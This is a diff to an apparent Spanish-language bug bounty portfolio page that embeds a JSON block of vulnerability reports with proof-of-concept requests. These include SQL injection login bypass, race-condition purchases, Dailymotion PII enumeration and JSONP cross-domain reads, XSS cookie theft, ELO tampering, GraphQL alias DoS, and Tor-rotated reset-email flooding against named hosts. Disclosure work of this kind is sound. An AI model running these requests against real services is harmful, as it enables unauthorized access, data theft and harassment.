@@ -32,7 +32,242 @@
     </div>
   </footer>
 
-  <script>
+<script id="bug-meta-data" type="application/json">
+{
+  "example-bug": {
+    "steps": [
+      "Abrir el formulario de login en /login",
+      "En el campo username introducir el payload: ' OR '1'='1' --",
+      "Dejar el campo password en blanco y enviar la petición",
+      "Observar que el servidor devuelve HTTP 200 OK con un token JWT válido sin credenciales correctas"
+    ],
+    "poc": "# Request HTTP capturado con Burp Suite\nPOST /api/v1/auth/login HTTP/1.1\nHost: [REDACTED]\nContent-Type: application/json\n\n{\"username\": \"' OR '1'='1' -- -\", \"password\": \"\"}\n\n# Response — login exitoso sin credenciales válidas\nHTTP/1.1 200 OK\n{\"token\": \"eyJhbGci...\", \"user\": {\"id\":1,\"role\":\"admin\"}}",
+    "recommendation": "Usar consultas preparadas (Prepared Statements) o un ORM en todas las interacciones con la base de datos. Nunca construir queries concatenando input del usuario. Añadir rate-limiting y bloqueo por intentos fallidos en el endpoint de login.",
+    "timeline": {
+      "reported": "2025-03-10",
+      "triaged": "2025-03-11",
+      "resolved": "2025-03-14"
+    },
+    "environment": "Node.js + MySQL 8.0 — API REST en producción",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "references": [
+      {
+        "label": "OWASP — SQL Injection",
+        "url": "https://owasp.org/www-community/attacks/SQL_Injection"
+      },
+      {
+        "label": "CWE-89",
+        "url": "https://cwe.mitre.org/data/definitions/89.html"
+      }
+    ]
+  },
+  "race-condition-multiple-purchase": {
+    "steps": [
+      "Autenticarse en la plataforma con una cuenta que tenga saldo suficiente para comprar exactamente un artículo de bajo valor.",
+      "Navegar a la tienda de avatares y seleccionar varios ítems con distintos componentId (ej. 58, 59, 60).",
+      "Capturar la petición POST /api/avatar/shop/purchase con Burp Suite al realizar una compra individual.",
+      "Enviar la petición capturada al módulo Turbo Intruder de Burp Suite.",
+      "Configurar el script de concurrencia para lanzar un batch de 10-20 peticiones simultáneas, cada una con un componentId diferente en el body JSON, usando la técnica HTTP/2 Single-Packet Attack.",
+      "Ejecutar el ataque de forma sincronizada para que el servidor reciba todas las peticiones dentro de la misma ventana de procesamiento.",
+      "Verificar que todas las respuestas retornan HTTP 200 OK y que el inventario contiene todos los artículos solicitados.",
+      "Comprobar que el saldo debitado corresponde únicamente al precio de uno o ninguno de los artículos."
+    ],
+    "poc": "# Petición individual capturada con Burp Suite\nPOST /api/avatar/shop/purchase HTTP/2\nHost: api.goblinajedrez.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nContent-Type: application/json\n\n{\"componentId\": 58}\n\n# Turbo Intruder — HTTP/2 Single-Packet Attack (batch simultáneo):\n# Petición 1: {\"componentId\": 58}\n# Petición 2: {\"componentId\": 59}\n# Petición 3: {\"componentId\": 60}\n# (todas disparadas en paralelo antes de que el servidor procese la primera)\n\n# Resultado observado:\n# - Todas las respuestas: HTTP/2 200 OK\n# - Inventario: artículos 58, 59 y 60 adquiridos\n# - Saldo debitado: precio de UN solo artículo (o ninguno)\n# CVSS:4.0 — 8.3 High",
+    "recommendation": "Implementar bloqueo a nivel de base de datos usando SELECT FOR UPDATE sobre la fila del usuario al iniciar la transacción. Ejecutar el decremento de saldo de forma atómica: UPDATE users SET balance = balance - precio WHERE id = :id AND balance >= precio. Si la query no afecta ninguna fila, abortar la transacción. Implementar un mutex/semáforo por user_id en el backend para garantizar que el usuario solo pueda tener una transacción activa a la vez.",
+    "timeline": {
+      "reported": "2026-04-14",
+      "triaged": null,
+      "resolved": null
+    },
+    "environment": "GoblinAjedrez — api.goblinajedrez.com — Endpoint de tienda de avatares",
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+    "references": [
+      {
+        "label": "PortSwigger — Race Conditions",
+        "url": "https://portswigger.net/research/smashing-the-state-machine"
+      },
+      {
+        "label": "CWE-362",
+        "url": "https://cwe.mitre.org/data/definitions/362.html"
+      },
+      {
+        "label": "OWASP — Race Conditions",
+        "url": "https://owasp.org/www-community/vulnerabilities/Race_condition"
+      }
+    ]
+  },
+  "idor-get-parameter": {
+    "steps": [
+      "Obtener un P_TOKEN (token de sesión) desde la cookie access_token de una sesión activa en dailymotion.com.",
+      "Obtener un TOKEN de aplicación mediante el flujo OAuth2 desde el panel de Dailymotion API Keys, con grant_type=password.",
+      "Enviar un campo inválido al endpoint de usuario para provocar el volcado del esquema interno de la BD y descubrir campos privados disponibles.",
+      "Usar el motor de búsqueda con un email conocido como parámetro ?search= para obtener el ID público del usuario asociado (Oracle de Email).",
+      "Con el ID descubierto, extraer PII del usuario: ciudad, país, género, checksums SHA-1 y metadatos de vídeos.",
+      "Usar el parámetro callback en la API de Partners para transformar la respuesta JSON en JSONP ejecutable, bypasseando SOP/CORS.",
+      "Automatizar la enumeración masiva con el script de auditoría para mapear miles de perfiles con su PII asociada."
+    ],
+    "poc": "# PASO 1 — Obtener TOKEN de aplicación (OAuth2)\ncurl -X POST \"https://api.dailymotion.com/oauth/token\" \\\n     -d \"grant_type=password\" \\\n     -d \"client_id=<CLIENT_ID>\" \\\n     -d \"client_secret=<CLIENT_SECRET>\" \\\n     -d \"username=<EMAIL>\" \\\n     -d \"password=<PASSWORD>\" \\\n     -d \"scope=read write\"\n\n# PASO 2 — Volcado de esquema interno (campo inválido)\ncurl -i -X GET \"https://api.dailymotion.com/user/x43py0?fields=invalid_parameter\" \\\n     -H \"Authorization: Bearer $TOKEN\"\n# Respuesta: lista completa de campos internos: email, revenues, address, city...\n\n# PASO 3 — Oracle de Email (desanonimizar usuario por email)\ncurl -i -X GET \"https://api.dailymotion.com/users?search=objetivo@dailymotion.com&fields=id,username\" \\\n     -H \"Authorization: Bearer $TOKEN\"\n\n# PASO 4 — Extracción de PII: género, ciudad, checksum SHA-1\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n     \"https://api.dailymotion.com/video/xa3yb0m?fields=owner.id,owner.gender,owner.created_time,checksum\"\n\n# PASO 5 — Bypass JSONP en API Partner (exfiltración cross-domain)\ncurl -i -X GET \"https://partner.api.dailymotion.com/rest/user/[ID]?fields=username,gender,country&callback=exploit\" \\\n     -H \"Authorization: Bearer $P_TOKEN\"\n# Respuesta: exploit({...datos del usuario...}) — ejecutable desde cualquier dominio",
+    "recommendation": "Excluir campos privados como email del índice del motor de búsqueda. Implementar respuestas de error genéricas (sin volcado de esquema) para parámetros inválidos. Deprecar el parámetro callback JSONP y migrar a CORS estricto. Aplicar control de acceso a nivel de campo para city, created_time y checksums. Implementar rate limiting en el endpoint /users?search=.",
+    "timeline": {
+      "reported": "2026-04-14",
+      "triaged": null,
+      "resolved": null
+    },
+    "environment": "Dailymotion — api.dailymotion.com + partner.api.dailymotion.com",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+    "references": [
+      {
+        "label": "CWE-200 — Exposure of Sensitive Information",
+        "url": "https://cwe.mitre.org/data/definitions/200.html"
+      },
+      {
+        "label": "CWE-639 — IDOR",
+        "url": "https://cwe.mitre.org/data/definitions/639.html"
+      },
+      {
+        "label": "OWASP — IDOR",
+        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"
+      }
+    ]
+  },
+  "reflected-xss-cookie-theft": {
+    "steps": [
+      "Identificar el parámetro vulnerable que refleja su valor en el HTML de respuesta sin codificación.",
+      "Inyectar un payload básico para confirmar la ejecución de JavaScript en el contexto del navegador.",
+      "Verificar que el payload no es filtrado ni codificado por el servidor.",
+      "Elaborar el payload de exfiltración de cookies apuntando a un servidor controlado por el atacante.",
+      "Enviar el enlace malicioso a la víctima y verificar la recepción de la cookie en el servidor externo.",
+      "Usar la cookie robada para secuestrar la sesión de la víctima."
+    ],
+    "poc": "# PASO 1 — Confirmación de ejecución (payload de prueba)\nGET /buscar?q=[PAYLOAD_XSS_BASICO] HTTP/1.1\nHost: [REDACTED]\n# Resultado esperado: ejecución de JavaScript en el navegador\n\n# PASO 2 — Exfiltración de cookies de sesión\n# El servidor no aplica HttpOnly en las cookies, permitiendo lectura desde JS.\n# Payload de robo de cookies enviado a servidor del atacante:\nGET /buscar?q=[PAYLOAD_LOCATION_REDIRECT_CON_COOKIE] HTTP/1.1\n\n# PASO 3 — Variante con img/onerror para evasión de filtros básicos\nGET /buscar?q=[PAYLOAD_IMG_ONERROR_FETCH_COOKIE] HTTP/1.1\n\n# PASO 4 — Verificación en el servidor del atacante\n# Escuchar con netcat o un servidor HTTP propio:\n# nc -lvnp 443\n# Log recibido con la cookie de sesión de la víctima\n# Resultado: sesión comprometida — CVSS:4.0 7.1 High\n#\n# Nota: Los payloads exactos se omiten intencionalmente.\n# La vulnerabilidad reside en la falta de codificacion de output\n# en el parametro de busqueda reflejado en la respuesta HTML.",
+    "recommendation": "Aplicar codificación HTML de output en todos los valores reflejados en la respuesta. Configurar Content-Security-Policy para restringir la ejecución de scripts inline. Añadir el flag HttpOnly a todas las cookies de sesión. Implementar el flag SameSite=Strict en las cookies.",
+    "timeline": {
+      "reported": "2026-04-18",
+      "triaged": null,
+      "resolved": null
+    },
+    "environment": "Securo — Aplicación web — Reflected XSS en parámetro de búsqueda",
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
+    "references": [
+      {
+        "label": "OWASP — XSS",
+        "url": "https://owasp.org/www-community/attacks/xss/"
+      },
+      {
+        "label": "CWE-79",
+        "url": "https://cwe.mitre.org/data/definitions/79.html"
+      },
+      {
+        "label": "PortSwigger — Reflected XSS",
+        "url": "https://portswigger.net/web-security/cross-site-scripting/reflected"
+      }
+    ]
+  },
+  "broken-access-score-update": {
+    "steps": [
+      "Iniciar sesión en GoblinAjedrez y obtener un token JWT válido desde el almacenamiento local del navegador.",
+      "Resolver un puzzle para que la aplicación genere una petición legítima a PATCH /api/users/elo.",
+      "Interceptar esa petición con Burp Suite antes de que llegue al servidor.",
+      "Observar el body JSON: {\"eloChange\": -16, \"puzzleRating\": 1268, \"attemptsMade\": 1}.",
+      "Modificar el parámetro eloChange a un valor positivo arbitrario (ej. 99) y reenviar la petición.",
+      "Verificar en el perfil que la puntuación ELO ha aumentado en la cantidad especificada.",
+      "Ejecutar el script poc_elo.sh con el flag -t TOKEN para automatizar múltiples peticiones y acumular ELO masivamente."
+    ],
+    "poc": "# Petición legítima (generada al resolver un puzzle)\nPATCH /api/users/elo HTTP/2\nHost: api.goblinajedrez.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nContent-Type: application/json\n\n{\"eloChange\": -16, \"puzzleRating\": 1268, \"attemptsMade\": 1}\n\n# Petición maliciosa (eloChange manipulado desde el cliente)\nPATCH /api/users/elo HTTP/2\nHost: api.goblinajedrez.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nContent-Type: application/json\n\n{\"eloChange\": 99, \"puzzleRating\": 1268, \"attemptsMade\": 1}\n\n# Respuesta del servidor — ELO actualizado con el valor del atacante\nHTTP/2 200 OK\n{\"elo\": <ELO_ANTERIOR + 99>}\n\n# Script de automatización (poc_elo.sh):\n# bash poc_elo.sh -t <JWT_TOKEN> -c 99 -n 50 -s 2\n# Resultado: +4950 ELO en menos de 2 minutos",
+    "recommendation": "Eliminar eloChange del body de la petición del cliente. El servidor debe calcular el delta de ELO internamente: const eloChange = calculateEloChange(userElo, puzzle.rating, isCorrect). Validar puzzleRating contra el ID de un puzzle real existente. Implementar rate-limiting de 10 peticiones por minuto al endpoint.",
+    "timeline": {
+      "reported": "2026-04-14",
+      "triaged": null,
+      "resolved": null
+    },
+    "environment": "GoblinAjedrez — api.goblinajedrez.com — Endpoint PATCH /api/users/elo",
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+    "references": [
+      {
+        "label": "OWASP — Broken Access Control",
+        "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+      },
+      {
+        "label": "CWE-639",
+        "url": "https://cwe.mitre.org/data/definitions/639.html"
+      },
+      {
+        "label": "CWE-284",
+        "url": "https://cwe.mitre.org/data/definitions/284.html"
+      }
+    ]
+  },
+  "dos-graphql-mutation": {
+    "steps": [
+      "Obtener un access_token válido desde las cookies de sesión del portal de partners de Dailymotion.",
+      "Identificar el endpoint GraphQL: https://partner.api.dailymotion.com/graphql.",
+      "Construir un payload de batching con múltiples aliases (r1, r2, r3...) apuntando a la mutation userEmailChangeRequest en una sola petición HTTP.",
+      "Enviar el payload con el token de sesión y registrar la cabecera X-Dm-Api-Backend-Response-Time en la respuesta.",
+      "Incrementar progresivamente el número de aliases (5, 10, 25, 50) y observar cómo el tiempo de respuesta escala linealmente.",
+      "Con 50 aliases verificar que el tiempo de respuesta supera los 1700-2000ms frente a menos de 200ms de una petición normal.",
+      "Ejecutar el script dailymotion_server_PoC.sh para automatizar 100 peticiones de auditoría y documentar la degradación del servicio."
+    ],
+    "poc": "# Payload de batching con 3 aliases (version reducida)\nPOST /graphql HTTP/2\nHost: partner.api.dailymotion.com\nAuthorization: Bearer <ACCESS_TOKEN>\nContent-Type: application/json\nX-Dm-Appinfo-Id: com.dailymotion.partner\nX-Dm-Appinfo-Type: website\n\n{\n  \"query\": \"mutation ResourceAudit($i1: UserEmailChangeRequestInput!, $i2: UserEmailChangeRequestInput!, $i3: UserEmailChangeRequestInput!) { r1:userEmailChangeRequest(input:$i1){status} r2:userEmailChangeRequest(input:$i2){status} r3:userEmailChangeRequest(input:$i3){status} }\",\n  \"variables\": {\n    \"i1\": {\"email\": \"audit_1@test.com\", \"password\": \"B123!\"},\n    \"i2\": {\"email\": \"audit_2@test.com\", \"password\": \"B123!\"},\n    \"i3\": {\"email\": \"audit_3@test.com\", \"password\": \"B123!\"}\n  }\n}\n\n# Resultados cabecera X-Dm-Api-Backend-Response-Time:\n# 1  alias  ->  ~180ms   (OPTIMAL)\n# 10 aliases -> ~600ms   (DEGRADADO)\n# 25 aliases -> ~1200ms  (INEFICIENTE)\n# 50 aliases -> ~1900ms  (STRESS)\n# CWE-400 — CVSS: 4.3 Medium",
+    "recommendation": "Restringir el numero maximo de aliases por operacion GraphQL (max 5-10). Implementar Query Cost Analysis asignando un peso a cada operacion. Reducir timeouts de backend para mutations costosas. Implementar rate limiting basado en mutaciones procesadas por minuto por usuario.",
+    "timeline": {
+      "reported": "2026-04-14",
+      "triaged": null,
+      "resolved": null
+    },
+    "environment": "Dailymotion Partner API — partner.api.dailymotion.com/graphql — Motor Tartiflette",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+    "references": [
+      {
+        "label": "CWE-400 — Resource Exhaustion",
+        "url": "https://cwe.mitre.org/data/definitions/400.html"
+      },
+      {
+        "label": "OWASP — GraphQL Security",
+        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL"
+      },
+      {
+        "label": "GraphQL Depth Limiting",
+        "url": "https://github.com/stems/graphql-depth-limit"
+      }
+    ]
+  },
+  "registration-bypass-ratelimit": {
+    "steps": [
+      "Confirmar que el registro no requiere verificación de email: enviar POST /api/auth/register con un email desechable y verificar que la cuenta queda activa sin validación.",
+      "Identificar el endpoint de reset de contraseña y realizar varias peticiones seguidas para confirmar que existe un rate limit basado en IP.",
+      "Añadir la cabecera X-Forwarded-For con una IP aleatoria en cada petición para simular un origen diferente y verificar que el límite se reinicia (bypass lógico).",
+      "Ejecutar poc.sh para demostrar el impacto: creación de cuenta sin verificación + bombardeo de 10 correos de reset al email objetivo.",
+      "Para el bypass físico: iniciar el servicio Tor y ejecutar poc2.sh, que rota automáticamente el circuito Tor cada 5 peticiones para evadir el rate limit basado en IP real.",
+      "Verificar que el buzón de la víctima recibe correos de reset de forma continua sin que se active ningún bloqueo."
+    ],
+    "poc": "# PARTE 1 — Registro sin verificación de email\nPOST /api/auth/register HTTP/2\nHost: api.goblinajedrez.com\nContent-Type: application/json\n\n{\"username\": \"bot_1748123456\", \"email\": \"bot_1748123456@trashmail.com\", \"password\": \"P@ssword123!\"}\n# Respuesta: {\"success\": true} — cuenta activa sin verificación de email\n\n# PARTE 2 — Bypass de rate limit con cabeceras HTTP (poc.sh)\n# El rate limit se aplica solo por IP, no por email ni sesión\nPOST /api/auth/reset-password HTTP/2\nHost: api.goblinajedrez.com\nX-Forwarded-For: <IP_ALEATORIA>\nX-Real-IP: <IP_ALEATORIA>\nContent-Type: application/json\n\n{\"email\": \"victima@example.com\"}\n# Respuesta: HTTP/2 200 OK — email de reset enviado (sin bloqueo)\n\n# PARTE 3 — Bypass físico con rotación Tor (poc2.sh)\n# El script reinicia el circuito Tor cada 5 peticiones para obtener nueva IP:\ncurl -s --proxy socks5h://127.0.0.1:9050 \\\n     -X POST https://api.goblinajedrez.com/api/auth/reset-password \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"email\": \"victima@example.com\"}'\n# Resultado: envío ilimitado de correos — rate limit nunca se activa",
+    "recommendation": "No permitir el acceso a la plataforma sin verificar el email mediante token enviado al correo. Implementar rate limiting basado en el JWT/Cookie de sesión o en la identidad del email solicitado, no solo en la IP. Añadir CAPTCHA en /register y /reset-password. Configurar el WAF para ignorar X-Forwarded-For de fuentes externas no confiables.",
+    "timeline": {
+      "reported": "2026-04-13",
+      "triaged": null,
+      "resolved": null
+    },
+    "environment": "GoblinAjedrez — api.goblinajedrez.com — Endpoints /api/auth/register y /api/auth/reset-password",
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+    "references": [
+      {
+        "label": "CWE-307 — Brute Force",
+        "url": "https://cwe.mitre.org/data/definitions/307.html"
+      },
+      {
+        "label": "CWE-799 — Rate Limiting",
+        "url": "https://cwe.mitre.org/data/definitions/799.html"
+      },
+      {
+        "label": "OWASP — Testing Account Enumeration",
+        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account"
+      }
+    ]
+  }
+}
+</script>
+
+    <script>
 
     const SEVERITY = {
       'Critical':      { color:'#ef4444', bg:'rgba(239,68,68,0.1)',   border:'rgba(239,68,68,0.3)'   },
@@ -63,40 +298,11 @@
          cvss_vector     vector CVSS completo
          attachments[]   { label, url }
     ─────────────────────────────────────────────────────────────────────── */
-    const BUG_META = {
+    const BUG_META = JSON.parse(document.getElementById('bug-meta-data').textContent);
 
-      "example-bug": {
-        steps: [
-          "Abrir el formulario de login en /login",
-          "En el campo username introducir: ' OR '1'='1' --",
-          "Dejar el campo password en blanco",
-          "Enviar la petición y observar que el acceso es concedido sin credenciales válidas"
-        ],
-        poc: `# Request HTTP capturado con Burp Suite
-POST /api/v1/auth/login HTTP/1.1
-Host: target.com
-Content-Type: application/json
+    /* ── Init };
 
-{"username": "' OR '1'='1' -- -", "password": ""}
-
-# Response
-HTTP/1.1 200 OK
-{"token": "eyJhbGci...", "user": {"id":1,"role":"admin"}}`,
-        recommendation: "Utilizar consultas preparadas (Prepared Statements) en todas las interacciones con la base de datos. Implementar un ORM o validación estricta del input antes de incluirlo en queries SQL. Añadir rate-limiting y bloqueo por intentos fallidos.",
-        timeline: {
-          reported: "2025-03-10",
-          triaged:  "2025-03-11",
-          resolved: "2025-03-14"
-        },
-        environment: "Node.js + MySQL 8.0 — API REST en producción",
-        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-        references: [
-          { label: "OWASP — SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
-          { label: "CWE-89", url: "https://cwe.mitre.org/data/definitions/89.html" }
-        ]
-      }
-
-    };
+    /* ── Init };
 
     /* ── Init ─────────────────────────────────────────────────────────────── */
     document.addEventListener('DOMContentLoaded', async () => {
@@ -147,9 +353,11 @@ HTTP/1.1 200 OK
         `<span class="ca-tag">#${t.toLowerCase()}</span>`).join('');
 
       // Timeline
-      const fmtDate = d => d
-        ? new Date(d).toLocaleDateString('en-US',{year:'numeric',month:'short',day:'numeric'})
-        : '—';
+      const fmtDate = d => {
+        if (!d || d === null) return '—';
+        const dt = new Date(d);
+        return isNaN(dt.getTime()) ? '—' : dt.toLocaleDateString('en-US',{year:'numeric',month:'short',day:'numeric'});
+      };
 
       const tlHtml = meta.timeline ? `
         <div class="bb-timeline">
@@ -176,7 +384,7 @@ HTTP/1.1 200 OK
       const stepsHtml = (meta.steps||[]).map((s,i) => `
         <li class="bb-step">
           <span class="bb-step-num">${String(i+1).padStart(2,'0')}</span>
-          <span>${s}</span>
+          <span>${escapeHtml(s)}</span>
         </li>`).join('');
 
       // References
@@ -277,7 +485,7 @@ HTTP/1.1 200 OK
           <h2 class="ca-section-title">
             <span class="ca-section-num">${num()}</span>Descripción
           </h2>
-          <p class="ca-body-text">${b.description}</p>
+          <p class="ca-body-text">${escapeHtml(b.description)}</p>
         </section>
 
         ${hasSummary ? `
@@ -285,7 +493,7 @@ HTTP/1.1 200 OK
           <h2 class="ca-section-title">
             <span class="ca-section-num">${num()}</span>Resumen técnico
           </h2>
-          <blockquote class="ca-quote ca-quote-neutral">${b.summary}</blockquote>
+          <blockquote class="ca-quote ca-quote-neutral">${escapeHtml(b.summary)}</blockquote>
         </section>` : ''}
 
         ${hasImpact ? `
@@ -299,7 +507,7 @@ HTTP/1.1 200 OK
               <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
               <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
             </svg>
-            <span style="color:var(--color-text);">${b.impact}</span>
+            <span style="color:var(--color-text);">${escapeHtml(b.impact)}</span>
           </div>
         </section>` : ''}
 
@@ -338,7 +546,7 @@ HTTP/1.1 200 OK
               <path d="M22 11.08V12a10 10 0 11-5.93-9.14"/>
               <polyline points="22 4 12 14.01 9 11.01"/>
             </svg>
-            <span style="color:var(--color-text);">${meta.recommendation}</span>
+            <span style="color:var(--color-text);">${escapeHtml(meta.recommendation)}</span>
           </div>
         </section>` : ''}
 
@@ -378,7 +586,7 @@ HTTP/1.1 200 OK
             </div>` : ''}
             ${hasEnv ? `<div class="ca-info-block" style="grid-column:span 2;">
               <span class="ca-info-label">Entorno</span>
-              <span class="ca-info-val">${meta.environment}</span>
+              <span class="ca-info-val">${escapeHtml(meta.environment)}</span>
             </div>` : ''}
             ${dateStr ? `<div class="ca-info-block">
               <span class="ca-info-label">Fecha</span>
